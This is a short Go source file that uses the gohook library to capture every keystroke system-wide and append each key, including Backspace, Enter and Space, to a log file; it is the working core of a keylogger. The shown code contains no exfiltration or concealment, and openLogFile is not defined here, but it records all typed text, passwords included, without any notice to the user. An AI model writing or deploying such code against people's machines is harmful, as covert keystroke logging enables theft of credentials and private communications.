package main

import (
	"fmt"
	"os"

	hook "github.com/robotn/gohook"
)

const (
	Backspace = 8
	Enter     = 13
	Space     = 32
)

func StartEventWriter() {
	file, err := openLogFile()
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to create log file: %v\n", err)
	}
	defer file.Close()

	events := hook.Start()
	for ev := range events {

		if ev.Kind == hook.KeyHold {

			switch ev.Rawcode {
			case Backspace:
				file.WriteString("Backspace\n")
			case Enter:
				file.WriteString("Enter\n")
			case Space:
				file.WriteString("Space\n")
			default:
				text := string(ev.Keychar) + "\n"
				file.WriteString(text)
			}
		}
	}
}
